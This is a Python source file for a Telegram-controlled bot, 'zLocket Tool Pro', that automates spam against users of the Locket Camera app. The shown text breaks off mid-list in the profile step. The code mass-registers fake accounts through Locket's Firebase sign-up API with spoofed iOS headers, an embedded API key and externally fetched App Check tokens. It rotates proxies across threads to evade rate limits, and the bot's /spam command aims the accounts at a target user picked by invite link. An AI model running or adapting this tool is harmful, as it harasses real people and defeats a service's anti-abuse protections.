#!/usr/bin/env python
# coding: utf-8
# Telegram: @wus_team
# Version: 1.0.7 (Telegram Bot)
# Github: https://github.com/wusthanhdieu
# Description: zLocket Tool Open Source - Telegram Bot Version

import sys
import subprocess
def _install_():
    try:
        from colorama import Fore, Style, init
        init()
    except ImportError:
        class DummyColors:
            def __getattr__(self, name):
                return ''
        Fore=Style=DummyColors()
    def itls(pkg):
        try:
            __import__(pkg)
            return True
        except ImportError:
            return False
    _list_={
        'requests': 'requests',
        'tqdm': 'tqdm',
        'colorama': 'colorama',
        'pystyle': 'pystyle',
        'urllib3': 'urllib3',
        'telebot': 'pyTelegramBotAPI',
    }
    _pkgs=[pkg_name for pkg_name in _list_ if not itls(pkg_name)]
    if _pkgs:
        print(f"{Fore.CYAN}{'=' * 50}{Style.RESET_ALL}")
        print(
            f"{Fore.YELLOW}[!] Bạn chưa có thư viện: {Fore.RED}{', '.join(_pkgs)}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'=' * 50}{Style.RESET_ALL}")
        
        print(f"{Fore.BLUE}[*] Đang cài đặt thư viện...{Style.RESET_ALL}")
        try:
            subprocess.check_call(
                [sys.executable, '-m', 'pip', 'install', *_pkgs])
            print(f"{Fore.GREEN}[✓] Cài đặt thành công!{Style.RESET_ALL}")
        except subprocess.CalledProcessError:
            print(
                f"{Fore.RED}[✗] Lỗi cài đặt, hãy thử cài tay bằng lệnh sau:{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}pip install {' '.join(_pkgs)}{Style.RESET_ALL}")
            input("Nhấn Enter để thoát...")
            sys.exit(1)
_install_()

import os, re, time, json, queue, string, random, threading, datetime
from queue import Queue
from itertools import cycle
from urllib.parse import urlparse, parse_qs, urlencode
import requests, urllib3
from requests.exceptions import ProxyError
from colorama import init, Back, Style
from typing import Optional, List
import telebot
from telebot import types

PRINT_LOCK=threading.RLock()
def sfprint(*args, **kwargs):
    with PRINT_LOCK:
        print(*args, **kwargs)
        sys.stdout.flush()

class xColor:
    YELLOW='\033[38;2;255;223;15m'
    GREEN='\033[38;2;0;209;35m'
    RED='\033[38;2;255;0;0m'
    BLUE='\033[38;2;0;132;255m'
    PURPLE='\033[38;2;170;0;255m'
    PINK='\033[38;2;255;0;170m'
    MAGENTA='\033[38;2;255;0;255m'
    ORANGE='\033[38;2;255;132;0m'
    CYAN='\033[38;2;0;255;255m'
    PASTEL_YELLOW='\033[38;2;255;255;153m'
    PASTEL_GREEN='\033[38;2;153;255;153m'
    PASTEL_BLUE='\033[38;2;153;204;255m'
    PASTEL_PINK='\033[38;2;255;153;204m'
    PASTEL_PURPLE='\033[38;2;204;153;255m'
    DARK_RED='\033[38;2;139;0;0m'
    DARK_GREEN='\033[38;2;0;100;0m'
    DARK_BLUE='\033[38;2;0;0;139m'
    DARK_PURPLE='\033[38;2;75;0;130m'
    GOLD='\033[38;2;255;215;0m'
    SILVER='\033[38;2;192;192;192m'
    BRONZE='\033[38;2;205;127;50m'
    NEON_GREEN='\033[38;2;57;255;20m'
    NEON_PINK='\033[38;2;255;20;147m'
    NEON_BLUE='\033[38;2;31;81;255m'
    WHITE='\033[38;2;255;255;255m'
    RESET='\033[0m'

# Global variables for Telegram Bot
bot = None
tool_running = False
tool_thread = None
stop_event = None
config = None

class zLocket:
    def __init__(self, device_token: str="", target_friend_uid: str="", num_threads: int=1, note_target: str=""):
        self.FIREBASE_GMPID="1:641029076083:ios:cc8eb46290d69b234fa606"
        self.IOS_BUNDLE_ID="com.locket.Locket"
        self.API_BASE_URL="https://api.locketcamera.com"
        self.FIREBASE_AUTH_URL="https://www.googleapis.com/identitytoolkit/v3/relyingparty"
        self.FIREBASE_API_KEY="AIzaSyCQngaaXQIfJaH0aS2l7REgIjD7nL431So"
        self.TOKEN_API_URL="https://thanhdieu.com/api/v1/locket/token"
        self.SHORT_URL="https://url.thanhdieu.com/api/v1"
        self.TOKEN_FILE_PATH="token.json"
        self.TOKEN_EXPIRY_TIME=(20 + 10) * 60
        self.FIREBASE_APP_CHECK=None
        self.USE_EMOJI=True
        self.ACCOUNTS_PER_PROXY=random.randint(6,10)
        self.NAME_TOOL="zLocket Tool Pro"
        self.VERSION_TOOL="v1.0.7"
        self.TARGET_FRIEND_UID=target_friend_uid if target_friend_uid else None
        self.PROXY_LIST=[
            # 'https://thanhdieu.com/api/list/free-proxy.txt',
        ]
        self.print_lock=threading.Lock()
        self.successful_requests=0
        self.failed_requests=0
        self.total_proxies=0
        self.start_time=time.time()
        self.spam_confirmed=False
        self.telegram='wus_team'
        self.author='WsThanhDieu'
        self.messages=[]
        self.request_timeout=15
        self.device_token=device_token
        self.num_threads=num_threads
        self.note_target=note_target
        self.session_id=int(time.time() * 1000)
        self._init_environment()
        self.FIREBASE_APP_CHECK=self._load_token_()
        if os.name == "nt":
            os.system(
                f"title 💰 {self.NAME_TOOL} {self.VERSION_TOOL} by Api.ThanhDieu.Com 💰"
         )

    def _print(self, *args, **kwargs):
        with PRINT_LOCK:
            timestamp=datetime.datetime.now().strftime("%H:%M:%S")
            message=" ".join(map(str, args))
            sm=message
            if "[+]" in message:
                sm=f"{xColor.GREEN}{Style.BRIGHT}{message}{Style.RESET_ALL}"
            elif "[✗]" in message:
                sm=f"{xColor.RED}{Style.BRIGHT}{message}{Style.RESET_ALL}"
            elif "[!]" in message:
                sm=f"{xColor.YELLOW}{Style.BRIGHT}{message}{Style.RESET_ALL}"
            sfprint(
                f"{xColor.CYAN}[{timestamp}]{Style.RESET_ALL} {sm}", **kwargs)

    def _loader_(self, message, duration=3):
        spinner=cycle(['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'])
        end_time=time.time() + duration
        while time.time() < end_time:
            with PRINT_LOCK:
                sys.stdout.write(f"\r{xColor.CYAN}{message} {next(spinner)} ")
                sys.stdout.flush()
            time.sleep(0.1)
        with PRINT_LOCK:
            sys.stdout.write(f"\r{xColor.GREEN}{message} ✓     \n")
            sys.stdout.flush()

    def _sequence_(self, message, duration=1.5, char_set="0123456789ABCDEF"):
        end_time = time.time() + duration
        while time.time() < end_time:
            random_hex = ''.join(random.choices(char_set, k=50))
            with PRINT_LOCK:
                sys.stdout.write(f"\r{xColor.GREEN}[{xColor.WHITE}*{xColor.GREEN}] {xColor.CYAN}{message}: {xColor.GREEN}{random_hex}")
                sys.stdout.flush()
            time.sleep(0.05)
        with PRINT_LOCK:
            sys.stdout.write("\n")
            sys.stdout.flush()

    def _randchar_(self, duration=2):
        special_chars="#$%^&*()[]{}!@<>?/\\|~`-=+_"
        hex_chars="0123456789ABCDEF"
        colors=[xColor.GREEN, xColor.RED, xColor.YELLOW,
                  xColor.CYAN, xColor.MAGENTA, xColor.NEON_GREEN]
        end_time=time.time() + duration
        while time.time() < end_time:
            length=random.randint(20, 40)
            vtd=""
            for _ in range(length):
                char_type=random.randint(1, 3)
                if char_type == 1:
                    vtd+=random.choice(special_chars)
                elif char_type == 2:
                    vtd+=random.choice(hex_chars)
                else:
                    vtd+=random.choice("xX0")
            status=random.choice([
                f"{xColor.GREEN}[ACCESS]",
                f"{xColor.RED}[DENIED]",
                f"{xColor.YELLOW}[BREACH]",
                f"{xColor.CYAN}[DECODE]",
                f"{xColor.MAGENTA}[ENCRYPT]"
            ])
            color=random.choice(colors)
            with PRINT_LOCK:
                sys.stdout.write(
                    f"\r{xColor.CYAN}[RUNNING TOOL] {color}{vtd} {status}")
                sys.stdout.flush()
            time.sleep(0.1)
        with PRINT_LOCK:
            print()

    def _blinking_(self, text, blinks=3, delay=0.1):
        for _ in range(blinks):
            with PRINT_LOCK:
                sys.stdout.write(f"\r{xColor.WHITE}{text}")
                sys.stdout.flush()
            time.sleep(delay)
            with PRINT_LOCK:
                sys.stdout.write(f"\r{' ' * len(text)}")
                sys.stdout.flush()
            time.sleep(delay)
        with PRINT_LOCK:
            sys.stdout.write(f"\r{xColor.GREEN}{text}\n")
            sys.stdout.flush()

    def _init_environment(self):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        init(autoreset=True)

    def _load_token_(self):
        try:
            if not os.path.exists(self.TOKEN_FILE_PATH):
                return self.fetch_token()
            self._loader_(
                f"{xColor.YELLOW}Verifying token integrity{Style.RESET_ALL}", 0.5)
            with open(self.TOKEN_FILE_PATH, 'r') as file:
                token_data=json.load(file)
            if 'token' in token_data and 'expiry' in token_data:
                if token_data['expiry'] > time.time():
                    self._print(
                        f"{xColor.GREEN}[+] {xColor.CYAN}Loaded token from file token.json: {xColor.YELLOW}{token_data['token'][:10] + '...' + token_data['token'][-10:]}")
                    time.sleep(0.4)
                    time_left=int(token_data['expiry'] - time.time())
                    self._print(
                        f"{xColor.GREEN}[+] {xColor.CYAN}Token expires in: {xColor.WHITE}{time_left//60} minutes {time_left % 60} seconds")
                    return token_data['token']
                else:
                    self._print(
                        f"{xColor.RED}[!]{xColor.RED} Locket token expired, trying to fetch new token")
            return self.fetch_token()
        except Exception as e:
            self._print(
                f"{xColor.RED}[!] {xColor.YELLOW}Error loading token from file: {str(e)}")
            return self.fetch_token()

    def save_token(self, token):
        try:
            token_data={
                'token': token,
                'expiry': time.time() + self.TOKEN_EXPIRY_TIME,
                'created_at': time.time()
            }
            with open(self.TOKEN_FILE_PATH, 'w') as file:
                json.dump(token_data, file, indent=4)

            self._print(
                f"{xColor.GREEN}[+] {xColor.CYAN}Token saved to {xColor.WHITE}{self.TOKEN_FILE_PATH}")
            return True
        except Exception as e:
            self._print(
                f"{xColor.RED}[!] {xColor.YELLOW}Error saving token to file: {str(e)}")
            return False

    def fetch_token(self, retry=0, max_retries=3):
        if retry == 0:
            self._print(
                f"{xColor.MAGENTA}[*] {xColor.CYAN}Initializing token authentication sequence")
            self._loader_("Establishing secure connection", 1)
        if retry >= max_retries:
            self._print(
                f"{xColor.RED}[!] {xColor.YELLOW}Token acquisition failed after {max_retries} attempts")
            self._loader_("Emergency shutdown", 1)
            sys.exit(1)
        try:
            self._print(
                f"{xColor.MAGENTA}[*] {xColor.CYAN}Preparing to retrieve token [{retry+1}/{max_retries}]")
            response=requests.get(self.TOKEN_API_URL, timeout=self.request_timeout, proxies={
                                    "http": None, "https": None})
            response.raise_for_status()
            data=response.json()
            if not isinstance(data, dict):
                self._print(
                    f"{xColor.YELLOW}[!] {xColor.WHITE}Invalid response format, retrying...")
                time.sleep(0.5)
                return self.fetch_token(retry + 1)
            if data.get("code") == 200 and "data" in data and "token" in data["data"]:
                token=data["data"]["token"]
                self._print(
                    f"{xColor.GREEN}[+] {xColor.CYAN}Token acquired successfully")
                masked_token=token[:10] + "..." + token[-10:]
                self._print(
                    f"{xColor.GREEN}[+] {xColor.WHITE}Token: {xColor.YELLOW}{masked_token}")
                self.save_token(token)
                return token
            elif data.get("code") in (403, 404, 502, 503, 504, 429, 500):
                self._print(
                    f"{xColor.YELLOW}[!] {xColor.RED}The Locket token server is no longer available, please contact us telegram @{self.author}, trying again...")
                time.sleep(1.3)
                return self.fetch_token(retry + 1)
            else:
                self._print(
                    f"{xColor.YELLOW}[!] {xColor.RED}{data.get('msg')}")
                time.sleep(1.3)
                return self.fetch_token(retry + 1)
        except requests.exceptions.RequestException as e:
            self._print(
                f"{xColor.RED}[!] Warning: {xColor.YELLOW}Token unauthorized, retrying... {e}")
            self._loader_("Attempting to reconnect", 1)
            time.sleep(1.3)
            return self.fetch_token(retry + 1)

    def headers_locket(self):
        return {
            'Host': 'api.locketcamera.com',
            'Accept': '*/*',
            'baggage': 'sentry-environment=production,sentry-public_key=78fa64317f434fd89d9cc728dd168f50,sentry-release=com.locket.Locket%401.121.1%2B1,sentry-trace_id=2cdda588ea0041ed93d052932b127a3e',
            'X-Firebase-AppCheck': self.FIREBASE_APP_CHECK,
            'Accept-Language': 'vi-VN,vi;q=0.9',
            'sentry-trace': '2cdda588ea0041ed93d052932b127a3e-a3e2ba7a095d4f9d-0',
            'User-Agent': 'com.locket.Locket/1.121.1 iPhone/18.2 hw/iPhone12_1',
            'Firebase-Instance-ID-Token': 'd7ChZwJHhEtsluXwXxbjmj:APA91bFoMIgxwf-2tmY9QLy82lKMEWL6S4d8vb9ctY3JxLLTQB1k6312TcgtqJjWFhQVz_J4wIFvE0Kfroztu1vbZDOFc65s0vvj68lNJM4XuJg1onEODiBG3r7YGrQLiHkBV1gEoJ5f',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
        }

    def firebase_headers_locket(self):
        base_headers=self.headers_locket()
        return {
            'Host': 'www.googleapis.com',
            'baggage': base_headers.get('baggage', ''),
            'Accept': '*/*',
            'X-Client-Version': 'iOS/FirebaseSDK/10.23.1/FirebaseCore-iOS',
            'X-Firebase-AppCheck': self.FIREBASE_APP_CHECK,
            'X-Ios-Bundle-Identifier': self.IOS_BUNDLE_ID,
            'X-Firebase-GMPID': '1:641029076083:ios:cc8eb46290d69b234fa606',
            'X-Firebase-Client': 'H4sIAAAAAAAAAKtWykhNLCpJSk0sKVayio7VUSpLLSrOzM9TslIyUqoFAFyivEQfAAAA',
            'sentry-trace': base_headers.get('sentry-trace', ''),
            'Accept-Language': 'vi',
            'User-Agent': 'FirebaseAuth.iOS/10.23.1 com.locket.Locket/1.121.1 iPhone/18.2 hw/iPhone12_1',
            'Connection': 'keep-alive',
            'X-Firebase-GMPID': self.FIREBASE_GMPID,
            'Content-Type': 'application/json',
        }

    def analytics_payload(self):
        return {
            "platform": "ios",
            "experiments": {
                "flag_4": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "43",
                },
                "flag_10": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "505",
                },
                "flag_6": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "2000",
                },
                "flag_3": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "501",
                },
                "flag_22": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "1203",
                },
                "flag_18": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "1203",
                },
                "flag_17": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "1010",
                },
                "flag_16": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "303",
                },
                "flag_15": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "501",
                },
                "flag_14": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "551",
                },
                "flag_25": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "23",
                },
            },
            "amplitude": {
                "device_id": "57A54C21-B633-418C-A6E3-4201E631178C",
                "session_id": {
                    "value": str(self.session_id),
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                },
            },
            "google_analytics": {"app_instance_id": "7E17CEB525FA4471BD6AA9CEC2C1BCB8"},
            "ios_version": "1.121.1.1",
        }

    def excute(self, url, headers=None, payload=None, thread_id=None, step=None, proxies_dict=None):
        prefix=f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}{step}{Style.RESET_ALL}]" if thread_id is not None and step else ""
        try:
            response=requests.post(
                url,
                headers=headers or self.headers_locket(),
                json=payload,
                proxies=proxies_dict,
                timeout=self.request_timeout,
                verify=False
            )
            response.raise_for_status()
            self.successful_requests+=1
            return response.json() if response.content else True
        except ProxyError:
            self._print(
                f"{prefix} {xColor.RED}[!] Proxy connection terminated")
            self.failed_requests+=1
            return "proxy_dead"
        except requests.exceptions.RequestException as e:
            self.failed_requests+=1
            if hasattr(e, 'response') and e.response is not None:
                status_code=e.response.status_code
                try:
                    error_data=e.response.json()
                    error_msg=error_data.get(
                        'error', 'Remote server rejected request')
                    self._print(
                        f"{prefix} {xColor.RED}[!] HTTP {status_code}: {error_msg}")
                except:
                    self._print(
                        f"{prefix} {xColor.RED}[!] Server connection timeout")
                if status_code == 429:
                    return "too_many_requests"
            return None

    def _extract_uid_locket(self, url: str) -> Optional[str]:
        real_url=self._convert_url(url)
        if not real_url:
            self.messages.append(
                f"Locket account not found, please try again.")
            return None
        parsed_url=urlparse(real_url)
        if parsed_url.hostname != "locket.camera":
            self.messages.append(
                f"Locket URL không hợp lệ: {parsed_url.hostname}")
            return None
        if not parsed_url.path.startswith("/invites/"):
            self.messages.append(
                f"Link Locket Sai Định Dạng: {parsed_url.path}")
            return None
        parts=parsed_url.path.split("/")
        if len(parts) > 2:
            full_uid=parts[2]
            uid=full_uid[:28]
            return uid
        self.messages.append("Không tìm thấy UID trong Link Locket")
        return None

    def _convert_url(self, url: str) -> str:
        if url.startswith("https://locket.camera/invites/"):
            return url
        if url.startswith("https://locket.cam/"):
            try:
                resp=requests.get(
                    url,
                    headers={
                        "User-Agent":
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0"
                    },
                    timeout=self.request_timeout,
                )
                if resp.status_code == 200:
                    match=re.search(
                        r'window\.location\.href\s*=\s*"([^"]+)"', resp.text)
                    if match:
                        parsed=urlparse(match.group(1))
                        query=parse_qs(parsed.query)
                        enc_link=query.get("link", [None])[0]
                        if enc_link:
                            return enc_link
                        else:
                            return None
                    else:
                        return None
                else:
                    return None
            except Exception as e:
                self.messages.append(
                    f"Failed to connect to the Locket server.")
                return ""
        payload={"type": "toLong", "kind": "url.thanhdieu.com", "url": url}
        headers={
            "Accept": "*/*",
            "Accept-Language": "vi",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent":
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15",
            "X-Requested-With": "XMLHttpRequest",
        }
        try:
            response=requests.post(
                self.SHORT_URL,
                headers=headers,
                data=urlencode(payload),
                timeout=self.request_timeout,
                verify=True,
            )
            response.raise_for_status()
            _res=response.json()
            if _res.get("status") == 1 and "url" in _res:
                return _res["url"]
            self.messages.append("Lỗi kết nối tới API Url.ThanhDieu.Com")
            return ""
        except requests.exceptions.RequestException as e:
            self.messages.append(
                "Lỗi kết nối tới API Url.ThanhDieu.Com " + str(e))
            return ""
        except ValueError:
            self.messages.append("Lỗi kết nối tới API Url.ThanhDieu.Com")
            return ""

# Telegram Bot Functions
def send_message_to_admin(message):
    """Send message to admin"""
    global bot
    if bot:
        try:
            # Thay YOUR_ADMIN_CHAT_ID bằng chat ID của bạn
            # Để lấy chat ID, gửi tin nhắn cho bot và check log
            bot.send_message(YOUR_ADMIN_CHAT_ID, message, parse_mode='HTML')
        except:
            pass

def setup_bot_handlers():
    """Setup all bot message handlers"""
    
    @bot.message_handler(commands=['start'])
    def start_command(message):
        welcome_text = f"""
🔒 <b>zLocket Tool Pro - Telegram Bot</b>

Chào mừng! Đây là bot điều khiển tool zLocket.

<b>Các lệnh có sẵn:</b>
/start - Hiển thị menu chính
/spam [target] [custom_name] - Bắt đầu spam
/stop - Dừng spam
/status - Kiểm tra trạng thái
/help - Hướng dẫn sử dụng

<b>Ví dụ sử dụng:</b>
<code>/spam username123 MyCustomName</code>
<code>/spam https://locket.cam/username123</code>

<i>Phát triển bởi @{config.author if config else 'WsThanhDieu'}</i>
"""

        markup = types.InlineKeyboardMarkup()
        markup.row(
            types.InlineKeyboardButton("🚀 Bắt đầu spam", callback_data="start_spam"),
            types.InlineKeyboardButton("⛔ Dừng spam", callback_data="stop_spam")
        )
        markup.row(
            types.InlineKeyboardButton("📊 Trạng thái", callback_data="status"),
            types.InlineKeyboardButton("❓ Hướng dẫn", callback_data="help")
        )

        bot.send_message(message.chat.id, welcome_text, parse_mode='HTML', reply_markup=markup)

    @bot.message_handler(commands=['spam'])
    def spam_command(message):
        global tool_running, tool_thread, config, stop_event

        if tool_running:
            bot.reply_to(message, "❌ Tool đang chạy! Sử dụng /stop để dừng trước.")
            return

        args = message.text.split()[1:]
        if len(args) < 1:
            bot.reply_to(message, "❌ Thiếu tham số!\n\nSử dụng: /spam [target] [custom_name]\nVí dụ: /spam username123 MyName")
            return

        target = args[0]
        custom_name = args[1] if len(args) > 1 else "zLocket Tool Pro"

        # Khởi tạo config nếu chưa có
        if not config:
            config = zLocket()

        # Xử lý target URL
        url = target.strip()
        if not url.startswith(("http://", "https://")) and not url.startswith("locket."):
            url = f"https://locket.cam/{url}"
        if url.startswith("locket."):
            url = f"https://{url}"

        # Extract UID
        config.messages = []
        uid = config._extract_uid_locket(url)

        if not uid:
            error_msg = "❌ Không thể lấy UID từ target:\n"
            for msg in config.messages:
                error_msg += f"• {msg}\n"
            bot.reply_to(message, error_msg)
            return

        # Cấu hình
        config.TARGET_FRIEND_UID = uid
        config.NAME_TOOL = custom_name
        config.USE_EMOJI = True

        bot.reply_to(message, f"✅ Đã cấu hình thành công!\n\n🎯 Target UID: <code>{uid}</code>\n👤 Custom Name: <code>{custom_name}</code>\n\n🚀 Đang khởi động tool...", parse_mode='HTML')

        # Bắt đầu spam thread
        def run_spam():
            global tool_running, stop_event
            try:
                tool_running = True
                stop_event = threading.Event()

                # Khởi tạo proxy
                proxy_queue, num_threads = init_proxy()
                num_threads = min(num_threads, 20)  # Giới hạn threads

                send_message_to_admin(f"🚀 Tool đã khởi động với {num_threads} threads")

                threads = []
                for i in range(num_threads):
                    if not tool_running:
                        break
                    thread = threading.Thread(
                        target=step1_create_account,
                        args=(i, proxy_queue, stop_event)
                    )
                    threads.append(thread)
                    thread.daemon = True
                    thread.start()

                send_message_to_admin("✅ Tất cả threads đã được khởi động! Spam đang chạy...")

                # Chờ cho đến khi tool_running = False
                while tool_running and any(t.is_alive() for t in threads):
                    time.sleep(1)

                # Dừng tất cả threads
                stop_event.set()
                for thread in threads:
                    thread.join(timeout=2)

                send_message_to_admin("⛔ Tool đã dừng hoàn toàn!")

            except Exception as e:
                send_message_to_admin(f"❌ Lỗi: {str(e)}")
            finally:
                tool_running = False

        tool_thread = threading.Thread(target=run_spam)
        tool_thread.start()

    @bot.message_handler(commands=['stop'])
    def stop_command(message):
        global tool_running, stop_event

        if not tool_running:
            bot.reply_to(message, "ℹ️ Tool hiện không chạy.")
            return

        tool_running = False
        if stop_event:
            stop_event.set()

        bot.reply_to(message, "⛔ Đang dừng tool...")

    @bot.message_handler(commands=['status'])
    def status_command(message):
        global tool_running, config

        if tool_running:
            status_text = "🟢 <b>Tool đang chạy</b>\n\n"
            if config:
                elapsed = time.time() - config.start_time
                hours, remainder = divmod(int(elapsed), 3600)
                minutes, seconds = divmod(remainder, 60)
                success_rate = (config.successful_requests / (config.successful_requests + config.failed_requests)) * 100 if (config.successful_requests + config.failed_requests) > 0 else 0

                status_text += f"⏱️ Runtime: <code>{hours:02d}:{minutes:02d}:{seconds:02d}</code>\n"
                status_text += f"✅ Success: <code>{config.successful_requests}</code>\n"
                status_text += f"❌ Failed: <code>{config.failed_requests}</code>\n"
                status_text += f"📊 Success Rate: <code>{success_rate:.1f}%</code>\n"
                status_text += f"🎯 Target: <code>{config.TARGET_FRIEND_UID}</code>\n"
                status_text += f"👤 Name: <code>{config.NAME_TOOL}</code>"
        else:
            status_text = "🔴 <b>Tool đang dừng</b>"

        bot.reply_to(message, status_text, parse_mode='HTML')

    @bot.message_handler(commands=['help'])
    def help_command(message):
        help_text = """
<b>🔒 zLocket Tool Pro - Hướng dẫn sử dụng</b>

<b>Các lệnh chính:</b>
• <code>/start</code> - Menu chính
• <code>/spam [target] [custom_name]</code> - Bắt đầu spam
• <code>/stop</code> - Dừng spam
• <code>/status</code> - Kiểm tra trạng thái
• <code>/help</code> - Hướng dẫn này

<b>Cách sử dụng lệnh /spam:</b>
<code>/spam username123</code>
<code>/spam username123 MyCustomName</code>
<code>/spam https://locket.cam/username123</code>
<code>/spam https://locket.cam/username123 MyName</code>

<b>Lưu ý:</b>
• Target có thể là username hoặc link đầy đủ
• Custom name tối đa 20 ký tự (tùy chọn)
• Tool sẽ tự động random emoji
• Sử dụng /stop để dừng tool bất cứ lúc nào

<b>Liên hệ:</b> @WsThanhDieu
"""
        bot.reply_to(message, help_text, parse_mode='HTML')

    @bot.callback_query_handler(func=lambda call: True)
    def callback_query(call):
        if call.data == "start_spam":
            bot.send_message(call.message.chat.id, "🚀 Để bắt đầu spam, sử dụng lệnh:\n\n<code>/spam [target] [custom_name]</code>\n\nVí dụ:\n<code>/spam username123 MyName</code>", parse_mode='HTML')
        elif call.data == "stop_spam":
            stop_command(call.message)
        elif call.data == "status":
            status_command(call.message)
        elif call.data == "help":
            help_command(call.message)

# Helper functions (giữ nguyên từ code cũ)
def _rand_str_(length=10, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(length))

def _rand_name_():
    return _rand_str_(8, chars=string.ascii_lowercase)

def _rand_email_():
    return f"{_rand_str_(15)}@thanhdieu.com"

def _rand_pw_():
    return 'zlocket' + _rand_str_(4)

def load_proxies():
    proxies=[]
    proxy_urls=config.PROXY_LIST
    config._print(
        f"{xColor.MAGENTA}{Style.BRIGHT}[*] {xColor.CYAN}Initializing proxy collection system...")
    try:
        with open('proxy.txt', 'r', encoding='utf-8') as f:
            file_proxies=[line.strip() for line in f if line.strip()]
            config._print(
                f"{xColor.MAGENTA}[+] {xColor.GREEN}Found {xColor.WHITE}{len(file_proxies)} {xColor.GREEN}proxies in local storage (proxy.txt)")
            config._loader_("Processing local proxies", 1)
            proxies.extend(file_proxies)
    except FileNotFoundError:
        config._print(
            f"{xColor.YELLOW}[!] {xColor.RED}No local proxy file detected, trying currently available proxies...")
    for url in proxy_urls:
        try:
            config._print(
                f"{xColor.MAGENTA}[*] {xColor.CYAN}Fetching proxies from {xColor.WHITE}{url}")
            config._loader_(f"Connecting to {url.split('/')[2]}", 1)
            response=requests.get(url, timeout=config.request_timeout)
            response.raise_for_status()
            url_proxies=[line.strip()
                           for line in response.text.splitlines() if line.strip()]
            proxies.extend(url_proxies)
            config._print(
                f"{xColor.MAGENTA}[+] {xColor.GREEN}Harvested {xColor.WHITE}{len(url_proxies)} {xColor.GREEN}proxies from {url.split('/')[2]}")
        except requests.exceptions.RequestException as e:
            config._print(
                f"{xColor.RED}[!] {xColor.YELLOW}Connection failed: {url.split('/')[2]} - {str(e)}")
    proxies=list(set(proxies))
    if not proxies:
        config._print(
            f"{xColor.RED}[!] Warning: No proxies available for operation")
        return []
    config.total_proxies=len(proxies)
    config._print(
        f"{xColor.GREEN}[+] {xColor.CYAN}Proxy harvesting complete{xColor.WHITE} {len(proxies)} {xColor.CYAN}unique proxies loaded")
    return proxies

def init_proxy():
    proxies = load_proxies()
    if not proxies:
        config._print(f"{xColor.RED}[!] {xColor.YELLOW}Note: Please add proxies to continue running the tool.")
        config._loader_("Shutting down system", 1)
        return [], 0
    random.shuffle(proxies)
    config._loader_("Optimizing proxy rotation algorithm", 1)
    proxy_queue = Queue()
    for proxy in proxies:
        proxy_queue.put(proxy)
    num_threads = min(len(proxies), 50)  # Giới hạn threads
    config._print(f"{xColor.GREEN}[+] {xColor.CYAN}Proxy system initialized with {xColor.WHITE}{num_threads} {xColor.CYAN}endpoints")
    return proxy_queue, num_threads

def format_proxy(proxy_str):
    if not proxy_str:
        return None
    try:
        if not proxy_str.startswith(('http://', 'https://')):
            proxy_str=f"http://{proxy_str}"
        return {"http": proxy_str, "https": proxy_str}
    except Exception as e:
        config._print(
            f"{xColor.RED}[!] {xColor.YELLOW}Proxy format error: {e}")
        return None

def get_proxy(proxy_queue, thread_id, stop_event=None):
    try:
        if stop_event is not None and stop_event.is_set():
            return None
        proxy_str=proxy_queue.get_nowait()
        return proxy_str
    except queue.Empty:
        if stop_event is None or not stop_event.is_set():
            config._print(
                f"{xColor.RED}[Thread-{thread_id:03d}] {xColor.YELLOW}Proxy pool exhausted")
        return None

def step1b_sign_in(email, password, thread_id, proxies_dict):
    if not email or not password:
        config._print(
            f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Auth{Style.RESET_ALL}] {xColor.RED}[✗] Authentication failed: Invalid credentials")
        return None
    payload={
        "email": email,
        "password": password,
        "clientType": "CLIENT_TYPE_IOS",
        "returnSecureToken": True
    }
    vtd=config.excute(
        f"{config.FIREBASE_AUTH_URL}/verifyPassword?key={config.FIREBASE_API_KEY}",
        headers=config.firebase_headers_locket(),
        payload=payload,
        thread_id=thread_id,
        step="Auth",
        proxies_dict=proxies_dict
    )
    if vtd and 'idToken' in vtd:
        config._print(
            f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Auth{Style.RESET_ALL}] {xColor.GREEN}[✓] Authentication successful")
        return vtd.get('idToken')
    config._print(
        f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Auth{Style.RESET_ALL}] {xColor.RED}[✗] Authentication failed")
    return None

def step2_finalize_user(id_token, thread_id, proxies_dict):
    if not id_token:
        config._print(
            f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Profile{Style.RESET_ALL}] {xColor.RED}[✗] Profile creation failed: Invalid token")
        return False
    first_name=config.NAME_TOOL
    last_name=' '.join(random.sample([
        '😀', '😂', '😍', '🥰', '😊', '😇', '😚', '😘', '😻', '😽', '🤗',
        '😎', '🥳', '😜', '🤩', '😢', '😡', '😴', '🙈', '🙌', '💖', '🔥', '👍',
        '✨', '🌟', '🍎', '🍕', '🚀', '🎉', '🎈', '🌈', '🐶', '🐱', '🦁',
        '😋', '😬', '😳', '😷', '🤓', '😈', '👻', '💪', '👏', '🙏', '💕', '💔',
